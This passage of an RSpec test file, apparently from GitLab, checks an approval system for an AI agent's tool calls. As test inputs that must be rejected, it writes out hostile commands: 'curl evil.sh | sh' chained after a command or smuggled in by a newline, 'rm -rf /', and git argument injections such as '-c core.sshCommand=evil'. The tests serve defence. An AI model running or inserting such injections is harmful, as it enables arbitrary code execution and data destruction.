    it { expect(workflow.to_ability_name).to eq('duo_workflow') }
  end

  describe '#web_url' do
    context 'when workflow is project-level' do
      let(:project) { build_stubbed(:project) }
      let(:workflow) { build_stubbed(:duo_workflows_workflow, id: 42, project: project, namespace: nil) }

      it 'returns the full URL by default' do
        url = workflow.web_url

        expect(url).to eq("http://localhost/#{project.full_path}/-/automate/agent-sessions/#{workflow.id}")
      end
    end

    context 'when workflow is namespace-level' do
      let(:group) { build_stubbed(:group) }
      let(:workflow) { build_stubbed(:duo_workflows_workflow, namespace: group, project: nil) }

      it 'returns nil' do
        url = workflow.web_url

        expect(url).to be_nil
      end
    end

    context 'when workflow has no project or namespace' do
      let(:workflow) { build_stubbed(:duo_workflows_workflow, project: nil, namespace: nil) }

      it 'returns nil' do
        url = workflow.web_url

        expect(url).to be_nil
      end
    end
  end

  describe 'ToolCallApprovals' do
    describe '#add_approval' do
      let(:approvals) { described_class::ToolCallApprovals.new }

      it 'adds a new tool approval with hashed call args' do
        approvals.add_approval(tool_name: 'run_command', call_args: '{"command": "ls"}')

        expect(approvals.to_h).to have_key('run_command')
        expect(approvals.to_h['run_command']).to have_key('call_args')
        expect(approvals.to_h['run_command']['call_args']).to be_an(Array)
      end

      it 'deduplicates identical call args' do
        call_args = '{"command": "ls"}'
        approvals.add_approval(tool_name: 'run_command', call_args: call_args)
        approvals.add_approval(tool_name: 'run_command', call_args: call_args)

        expect(approvals.to_h['run_command']['call_args'].size).to eq(1)
      end

      it 'stores different call args for the same tool' do
        approvals.add_approval(tool_name: 'run_command', call_args: '{"command": "ls"}')
        approvals.add_approval(tool_name: 'run_command', call_args: '{"command": "pwd"}')

        expect(approvals.to_h['run_command']['call_args'].size).to eq(2)
      end

      it 'stores hashes of call args' do
        call_args = '{"command": "ls"}'
        approvals.add_approval(tool_name: 'run_command', call_args: call_args)

        expected_hash = Digest::SHA256.hexdigest(call_args)
        expect(approvals.to_h['run_command']['call_args']).to include(expected_hash)
      end
    end

    describe '#to_h' do
      it 'returns the approvals as a hash' do
        approvals = described_class::ToolCallApprovals.new(
          'run_command' => { 'call_args' => %w[hash1 hash2] }
        )

        result = approvals.to_h
        expect(result).to eq('run_command' => { 'call_args' => %w[hash1 hash2] })
      end
    end

    describe '#add_pattern_approval' do
      let(:approvals) { described_class::ToolCallApprovals.new }

      it 'adds a pattern approval for a tool' do
        approvals.add_pattern_approval(tool_name: 'run_command', pattern: '*npm*')

        expect(approvals.to_h['run_command']['patterns']).to eq(['*npm*'])
      end

      it 'deduplicates identical patterns' do
        approvals.add_pattern_approval(tool_name: 'run_command', pattern: '*npm*')
        approvals.add_pattern_approval(tool_name: 'run_command', pattern: '*npm*')

        expect(approvals.to_h['run_command']['patterns'].size).to eq(1)
      end

      it 'stores different patterns for the same tool' do
        approvals.add_pattern_approval(tool_name: 'run_command', pattern: '*npm*')
        approvals.add_pattern_approval(tool_name: 'run_command', pattern: '*yarn*')

        expect(approvals.to_h['run_command']['patterns'].size).to eq(2)
      end

      it 'raises ArgumentError for empty pattern' do
        expect do
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: '')
        end.to raise_error(ArgumentError, 'Pattern must be a non-empty string')
      end

      it 'raises ArgumentError for non-string pattern' do
        expect do
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: 123)
        end.to raise_error(ArgumentError, 'Pattern must be a non-empty string')
      end

      it 'raises ArgumentError for pattern exceeding 256 characters' do
        expect do
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: 'a' * 257)
        end.to raise_error(ArgumentError, 'Pattern must not exceed 256 characters')
      end

      it 'initializes call_args array when adding pattern to new tool' do
        approvals.add_pattern_approval(tool_name: 'run_command', pattern: '*npm*')

        expect(approvals.to_h['run_command']['call_args']).to eq([])
      end

      it 'raises ArgumentError for bare wildcard on run_command' do
        expect do
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: '*')
        end.to raise_error(ArgumentError, 'Wildcard-only patterns are not allowed for command tools')
      end

      it 'raises ArgumentError for bare wildcard on run_git_command' do
        expect do
          approvals.add_pattern_approval(tool_name: 'run_git_command', pattern: '*')
        end.to raise_error(ArgumentError, 'Wildcard-only patterns are not allowed for command tools')
      end

      it 'allows bare wildcard on non-command tools' do
        expect do
          approvals.add_pattern_approval(tool_name: 'read_file', pattern: '*')
        end.not_to raise_error
      end

      context 'when pattern contains shell metacharacters' do
        let(:metacharacter_error) do
          'Patterns for command tools must not contain shell metacharacters (;, &, |, <, >, $, `, newlines, etc.)'
        end

        %w[run_command run_git_command].each do |tool_name|
          context "with #{tool_name}" do
            it 'rejects patterns with semicolons' do
              expect do
                approvals.add_pattern_approval(tool_name: tool_name, pattern: 'echo hello; echo *')
              end.to raise_error(ArgumentError, metacharacter_error)
            end

            it 'rejects patterns with AND chaining' do
              expect do
                approvals.add_pattern_approval(tool_name: tool_name, pattern: 'echo hello && echo *')
              end.to raise_error(ArgumentError, metacharacter_error)
            end

            it 'rejects patterns with pipe' do
              expect do
                approvals.add_pattern_approval(tool_name: tool_name, pattern: 'cat file | grep *')
              end.to raise_error(ArgumentError, metacharacter_error)
            end

            it 'rejects patterns with output redirection' do
              expect do
                approvals.add_pattern_approval(tool_name: tool_name, pattern: 'echo hello > *')
              end.to raise_error(ArgumentError, metacharacter_error)
            end

            it 'rejects patterns with dollar substitution' do
              expect do
                approvals.add_pattern_approval(tool_name: tool_name, pattern: 'echo $(whoami) *')
              end.to raise_error(ArgumentError, metacharacter_error)
            end

            it 'rejects patterns with backtick substitution' do
              expect do
                approvals.add_pattern_approval(tool_name: tool_name, pattern: 'echo `whoami` *')
              end.to raise_error(ArgumentError, metacharacter_error)
            end

            it 'rejects patterns with newlines' do
              expect do
                approvals.add_pattern_approval(tool_name: tool_name, pattern: "echo hello\ncurl evil *")
              end.to raise_error(ArgumentError, metacharacter_error)
            end

            it 'rejects patterns with carriage returns' do
              expect do
                approvals.add_pattern_approval(tool_name: tool_name, pattern: "echo hello\rcurl evil *")
              end.to raise_error(ArgumentError, metacharacter_error)
            end
          end
        end

        it 'allows patterns with metacharacters for non-command tools' do
          expect do
            approvals.add_pattern_approval(tool_name: 'read_file', pattern: '/tmp/$HOME/*')
          end.not_to raise_error
        end
      end

      it 'raises ArgumentError when exceeding maximum patterns per tool' do
        100.times { |i| approvals.add_pattern_approval(tool_name: 'run_command', pattern: "pattern_#{i}") }

        expect do
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: 'one_too_many')
        end.to raise_error(ArgumentError, 'Maximum of 100 patterns per tool')
      end

      it 'allows up to 100 patterns per tool' do
        100.times { |i| approvals.add_pattern_approval(tool_name: 'run_command', pattern: "pattern_#{i}") }

        expect(approvals.to_h['run_command']['patterns'].size).to eq(100)
      end
    end

    describe '#approved?' do
      it 'returns true for exact hash match' do
        approvals = described_class::ToolCallApprovals.new
        call_args = '{"command": "ls"}'
        approvals.add_approval(tool_name: 'run_command', call_args: call_args)

        expect(approvals.approved?(tool_name: 'run_command', call_args: call_args)).to be true
      end

      context 'with command tools (run_command)' do
        it 'matches pattern against extracted command string (shell form)' do
          approvals = described_class::ToolCallApprovals.new
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: 'git checkout *')

          expect(approvals.approved?(
            tool_name: 'run_command',
            call_args: '{"command": "git checkout feature/my-branch"}'
          )).to be true
        end

        it 'matches pattern against extracted command string (split args form)' do
          approvals = described_class::ToolCallApprovals.new
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: 'git checkout *')

          expect(approvals.approved?(
            tool_name: 'run_command',
            call_args: '{"program": "git", "args": "checkout feature/my-branch"}'
          )).to be true
        end

        it 'returns false when command does not match pattern' do
          approvals = described_class::ToolCallApprovals.new
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: 'git checkout *')

          expect(approvals.approved?(
            tool_name: 'run_command',
            call_args: '{"command": "rm -rf /"}'
          )).to be false
        end

        it 'rejects pattern-based approval for unregistered programs (fail-closed)' do
          approvals = described_class::ToolCallApprovals.new
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: 'npm *')

          expect(approvals.approved?(
            tool_name: 'run_command',
            call_args: '{"command": "npm install --prefix /opt/app"}'
          )).to be false
        end

        it 'rejects pattern-based approval for commands starting with ./ (unregistered)' do
          approvals = described_class::ToolCallApprovals.new
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: './*')

          expect(approvals.approved?(
            tool_name: 'run_command',
            call_args: '{"command": "./build.sh"}'
          )).to be false
        end

        it 'rejects pattern-based approval for program-only args (unregistered)' do
          approvals = described_class::ToolCallApprovals.new
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: 'ls')

          expect(approvals.approved?(
            tool_name: 'run_command',
            call_args: '{"program": "ls"}'
          )).to be false
        end

        it 'rejects pattern-based approval on invalid JSON (fail-closed)' do
          approvals = described_class::ToolCallApprovals.new
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: '*not-json*')

          expect(approvals.approved?(
            tool_name: 'run_command',
            call_args: 'this is not-json'
          )).to be false
        end
      end

      context 'with git command tools (run_git_command)' do
        it 'matches pattern against extracted command string' do
          approvals = described_class::ToolCallApprovals.new
          approvals.add_pattern_approval(tool_name: 'run_git_command', pattern: 'git checkout *')

          expect(approvals.approved?(
            tool_name: 'run_git_command',
            call_args: '{"command":"checkout","args":"feature/my-branch","repository_url":"https://example.com/repo.git"}'
          )).to be true
        end

        it 'returns false when command does not match pattern' do
          approvals = described_class::ToolCallApprovals.new
          approvals.add_pattern_approval(tool_name: 'run_git_command', pattern: 'git checkout *')

          expect(approvals.approved?(
            tool_name: 'run_git_command',
            call_args: '{"command":"push","args":"--force","repository_url":"https://example.com/repo.git"}'
          )).to be false
        end

        it 'matches when args is nil' do
          approvals = described_class::ToolCallApprovals.new
          approvals.add_pattern_approval(tool_name: 'run_git_command', pattern: 'git status')

          expect(approvals.approved?(
            tool_name: 'run_git_command',
            call_args: '{"command":"status","repository_url":"https://example.com/repo.git"}'
          )).to be true
        end
      end

      context 'with non-command tools' do
        it 'matches pattern against raw call_args string' do
          approvals = described_class::ToolCallApprovals.new
          approvals.add_pattern_approval(tool_name: 'read_file', pattern: '*test*')

          expect(approvals.approved?(
            tool_name: 'read_file',
            call_args: '{"path": "/tmp/test.txt"}'
          )).to be true
        end

        it 'returns false when pattern does not match' do
          approvals = described_class::ToolCallApprovals.new
          approvals.add_pattern_approval(tool_name: 'read_file', pattern: '*yarn*')

          expect(approvals.approved?(
            tool_name: 'read_file',
            call_args: '{"path": "/tmp/test.txt"}'
          )).to be false
        end
      end

      it 'returns false for unknown tool' do
        approvals = described_class::ToolCallApprovals.new
        approvals.add_approval(tool_name: 'run_command', call_args: '{"command": "ls"}')

        expect(approvals.approved?(tool_name: 'unknown_tool', call_args: '{"command": "ls"}')).to be false
      end

      it 'returns true with exact match when no patterns key exists (backward compat)' do
        approvals = described_class::ToolCallApprovals.new(
          'run_command' => { 'call_args' => [Digest::SHA256.hexdigest('{"command": "ls"}')] }
        )

        expect(approvals.approved?(tool_name: 'run_command', call_args: '{"command": "ls"}')).to be true
      end
    end

    describe 'shell metacharacter rejection in pattern matching' do
      let(:approvals) { described_class::ToolCallApprovals.new }

      before do
        approvals.add_pattern_approval(tool_name: 'run_command', pattern: 'git checkout *')
      end

      it 'allows clean commands that match the pattern' do
        expect(approvals.approved?(
          tool_name: 'run_command',
          call_args: '{"command": "git checkout feature-branch"}'
        )).to be true
      end

      it 'rejects commands with semicolon injection' do
        expect(approvals.approved?(
          tool_name: 'run_command',
          call_args: '{"command": "git checkout main; curl evil.sh | sh"}'
        )).to be false
      end

      it 'rejects commands with pipe injection' do
        expect(approvals.approved?(
          tool_name: 'run_command',
          call_args: '{"command": "git checkout main | tee /tmp/log"}'
        )).to be false
      end

      it 'rejects commands with AND chaining' do
        expect(approvals.approved?(
          tool_name: 'run_command',
          call_args: '{"command": "git checkout main && rm -rf /"}'
        )).to be false
      end

      it 'rejects commands with OR chaining' do
        expect(approvals.approved?(
          tool_name: 'run_command',
          call_args: '{"command": "git checkout main || echo pwned"}'
        )).to be false
      end

      it 'rejects commands with backtick substitution' do
        expect(approvals.approved?(
          tool_name: 'run_command',
          call_args: '{"command": "git checkout `whoami`"}'
        )).to be false
      end

      it 'rejects commands with dollar substitution' do
        expect(approvals.approved?(
          tool_name: 'run_command',
          call_args: '{"command": "git checkout $(whoami)"}'
        )).to be false
      end

      it 'rejects commands with output redirection' do
        expect(approvals.approved?(
          tool_name: 'run_command',
          call_args: '{"command": "git checkout main > /tmp/out"}'
        )).to be false
      end

      it 'rejects commands with input redirection' do
        expect(approvals.approved?(
          tool_name: 'run_command',
          call_args: '{"command": "git checkout main < /dev/null"}'
        )).to be false
      end

      it 'rejects commands with newline injection' do
        expect(approvals.approved?(
          tool_name: 'run_command',
          call_args: "{\"command\": \"git checkout main\\ncurl evil.sh\"}"
        )).to be false
      end

      it 'rejects commands with carriage return injection' do
        expect(approvals.approved?(
          tool_name: 'run_command',
          call_args: "{\"command\": \"git checkout main\\rcurl evil.sh\"}"
        )).to be false
      end

      it 'rejects commands with unbalanced quotes' do
        expect(approvals.approved?(
          tool_name: 'run_command',
          call_args: '{"command": "git checkout \\"main"}'
        )).to be false
      end

      it 'still allows exact-match approval for commands with metacharacters' do
        dangerous_args = '{"command": "git checkout main; curl evil"}'
        approvals.add_approval(tool_name: 'run_command', call_args: dangerous_args)

        expect(approvals.approved?(
          tool_name: 'run_command',
          call_args: dangerous_args
        )).to be true
      end

      it 'does not apply metacharacter rejection to non-command tools' do
        approvals.add_pattern_approval(tool_name: 'read_file', pattern: '*')

        expect(approvals.approved?(
          tool_name: 'read_file',
          call_args: '{"path": "/tmp/$HOME/test"}'
        )).to be true
      end

      context 'with run_git_command' do
        before do
          approvals.add_pattern_approval(tool_name: 'run_git_command', pattern: 'git checkout *')
        end

        it 'rejects git commands with metacharacters' do
          expect(approvals.approved?(
            tool_name: 'run_git_command',
            call_args: '{"command":"checkout","args":"main; curl evil","repository_url":"https://example.com/repo.git"}'
          )).to be false
        end

        it 'allows clean git commands' do
          expect(approvals.approved?(
            tool_name: 'run_git_command',
            call_args: '{"command":"checkout","args":"feature-branch","repository_url":"https://example.com/repo.git"}'
          )).to be true
        end
      end

      context 'with run_command program+args form' do
        before do
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: 'npm *')
        end

        it 'rejects program+args commands with metacharacters' do
          expect(approvals.approved?(
            tool_name: 'run_command',
            call_args: '{"program": "npm", "args": "install; curl evil"}'
          )).to be false
        end
      end
    end

    describe 'argument injection rejection in pattern matching' do
      using RSpec::Parameterized::TableSyntax

      let(:approvals) { described_class::ToolCallApprovals.new }

      context 'with run_command (git commands via freeform shell form)' do
        before do
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: 'git *')
        end

        where(:description, :command, :expected) do
          [
            ['-c core.sshCommand injection', 'git -c core.sshCommand=evil fetch', false],
            ['--exec-path injection', 'git --exec-path=/evil status', false],
            ['--upload-pack on clone', 'git clone --upload-pack=evil https://example.com/repo.git', false],
            ['--receive-pack on push', 'git push --receive-pack=evil origin main', false],
            ['-C directory change', 'git -C /dangerous/path status', false],
            ['--open-files-in-pager on grep', 'git grep --open-files-in-pager=evil pattern', false],
            ['-c subcommand flag on clone', 'git clone -c core.fsmonitor=evil https://example.com/repo.git', false],
            ['--config on clone', 'git clone --config core.sshCommand=evil https://example.com/repo.git', false],
            ['safe checkout', 'git checkout feature-branch', true],
            ['safe commit', 'git commit -m fix-bug', true],
            ['safe --no-pager log', 'git --no-pager log', true]
          ]
        end

        with_them do
          it "#{params[:expected] ? 'allows' : 'rejects'} #{params[:description]}" do
            expect(approvals.approved?(
              tool_name: 'run_command',
              call_args: "{\"command\": \"#{command}\"}"
            )).to be expected
          end
        end

        it 'still allows exact-match for dangerous git commands' do
          dangerous_args = '{"command": "git -c core.sshCommand=evil fetch"}'
          approvals.add_approval(tool_name: 'run_command', call_args: dangerous_args)

          expect(approvals.approved?(
            tool_name: 'run_command',
            call_args: dangerous_args
          )).to be true
        end
      end

      context 'with run_command (git commands via program+args form)' do
        before do
          approvals.add_pattern_approval(tool_name: 'run_command', pattern: 'git *')
        end

        where(:description, :args_json, :expected) do
          [
            ['injection via -c', '{"program": "git", "args": "-c core.sshCommand=evil fetch"}', false],
            ['safe checkout', '{"program": "git", "args": "checkout feature-branch"}', true]
          ]
        end

        with_them do
          it "#{params[:expected] ? 'allows' : 'rejects'} #{params[:description]}" do
            expect(approvals.approved?(
              tool_name: 'run_command',
              call_args: args_json
            )).to be expected
          end
        end
      end

      context 'with run_git_command' do
        before do
          approvals.add_pattern_approval(tool_name: 'run_git_command', pattern: 'git *')
        end

        where(:description, :args_json, :expected) do
          [
            ['-c flag as command field',
              '{"command":"-c","args":"core.sshCommand=evil fetch","repository_url":"https://example.com/repo.git"}',
              false],
            ['--upload-pack in args',
              '{"command":"clone","args":"--upload-pack=evil https://example.com/repo.git","repository_url":"https://example.com/repo.git"}',
              false],
            ['--receive-pack in args',
              '{"command":"push","args":"--receive-pack=evil origin main","repository_url":"https://example.com/repo.git"}',
              false],
            ['safe checkout',
              '{"command":"checkout","args":"feature-branch","repository_url":"https://example.com/repo.git"}',
              true],
            ['status with no args',
              '{"command":"status","repository_url":"https://example.com/repo.git"}',
              true]
          ]
        end

        with_them do
          it "#{params[:expected] ? 'allows' : 'rejects'} #{params[:description]}" do
            expect(approvals.approved?(
              tool_name: 'run_git_command',
              call_args: args_json
            )).to be expected
          end
        end
      end

      context 'with non-git programs via run_command (fail-closed, no registered validator)' do
        where(:description, :pattern, :args_json) do
          [
            ['npm',    'npm *',    '{"command": "npm install --save react"}'],
            ['python', 'python *', '{"command": "python test.py"}'],
            ['curl',   'curl *',   '{"command": "curl http://example.com -o /tmp/file"}']
          ]
        end

        with_them do
          it "rejects pattern-based approval for #{params[:description]} (requires exact-match)" do
            approvals.add_pattern_approval(tool_name: 'run_command', pattern: pattern)

            expect(approvals.approved?(
              tool_name: 'run_command',
              call_args: args_json
            )).to be false
          end
        end

        it 'still allows exact-match approval for unregistered programs' do
          args = '{"command": "npm install --save react"}'
          approvals.add_approval(tool_name: 'run_command', call_args: args)

          expect(approvals.approved?(
            tool_name: 'run_command',
            call_args: args
          )).to be true
        end
      end

      context 'with non-command tools' do
        it 'does not apply command validation to non-command tools' do
          approvals.add_pattern_approval(tool_name: 'read_file', pattern: '*')

          expect(approvals.approved?(
            tool_name: 'read_file',
            call_args: '{"path": "/tmp/test"}'
          )).to be true
        end
      end
    end

    describe 'hash-like interface' do
      let(:approvals) { described_class::ToolCallApprovals.new }

      it 'supports [] access' do
        approvals['run_command'] = { 'call_args' => %w[hash1] }
        expect(approvals['run_command']).to eq({ 'call_args' => %w[hash1] })
      end

      it 'supports keys method' do
        approvals['run_command'] = { 'call_args' => [] }
        approvals['git_clone'] = { 'call_args' => [] }

        expect(approvals.keys).to contain_exactly('run_command', 'git_clone')
      end

      it 'supports empty? method' do
        expect(approvals.empty?).to be true
        approvals['run_command'] = { 'call_args' => [] }
        expect(approvals.empty?).to be false
      end

      it 'supports each method' do
        approvals.add_approval(tool_name: 'run_command', call_args: '{"command": "ls"}')
        approvals.add_approval(tool_name: 'git_clone', call_args: '{"repo": "url"}')

        yielded = {}
        approvals.each { |tool_name, approval| yielded[tool_name] = approval }

        expect(yielded.keys).to contain_exactly('run_command', 'git_clone')
        expect(yielded['run_command']).to have_key('call_args')
        expect(yielded['git_clone']).to have_key('call_args')
      end
    end
  end

  describe '#add_tool_call_approval' do
    let(:workflow) { create(:duo_workflows_workflow) }

    it 'adds a tool call approval and persists it' do
      workflow.add_tool_call_approval(tool_name: 'run_command', call_args: '{"command": "ls"}')

      expect(workflow.tool_call_approvals).to have_key('run_command')
      expect(workflow.tool_call_approvals['run_command']).to have_key('call_args')
    end

    it 'appends to existing approvals' do
      workflow.add_tool_call_approval(tool_name: 'run_command', call_args: '{"command": "ls"}')
      workflow.add_tool_call_approval(tool_name: 'git_clone', call_args: '{"repo": "url"}')

      expect(workflow.tool_call_approvals).to have_key('run_command')
      expect(workflow.tool_call_approvals).to have_key('git_clone')
    end

    it 'deduplicates identical call args for the same tool' do
      call_args = '{"command": "ls"}'
      workflow.add_tool_call_approval(tool_name: 'run_command', call_args: call_args)
      workflow.add_tool_call_approval(tool_name: 'run_command', call_args: call_args)

      # call_args is consistently stored as an array
      expect(workflow.tool_call_approvals['run_command']['call_args'].size).to eq(1)
    end
  end

  describe '#add_tool_call_pattern_approval' do
    let(:workflow) { build(:duo_workflows_workflow) }

    it 'adds a pattern approval and persists it' do
      workflow.add_tool_call_pattern_approval(tool_name: 'run_command', pattern: '*npm*')

      expect(workflow.tool_call_approvals['run_command']['patterns']).to eq(['*npm*'])
    end

    it 'appends to existing patterns' do
      workflow.add_tool_call_pattern_approval(tool_name: 'run_command', pattern: '*npm*')
      workflow.add_tool_call_pattern_approval(tool_name: 'run_command', pattern: '*yarn*')

      expect(workflow.tool_call_approvals['run_command']['patterns']).to contain_exactly('*npm*', '*yarn*')
    end

    it 'deduplicates identical patterns for the same tool' do
      workflow.add_tool_call_pattern_approval(tool_name: 'run_command', pattern: '*npm*')
      workflow.add_tool_call_pattern_approval(tool_name: 'run_command', pattern: '*npm*')

      expect(workflow.tool_call_approvals['run_command']['patterns'].size).to eq(1)
    end
  end
end
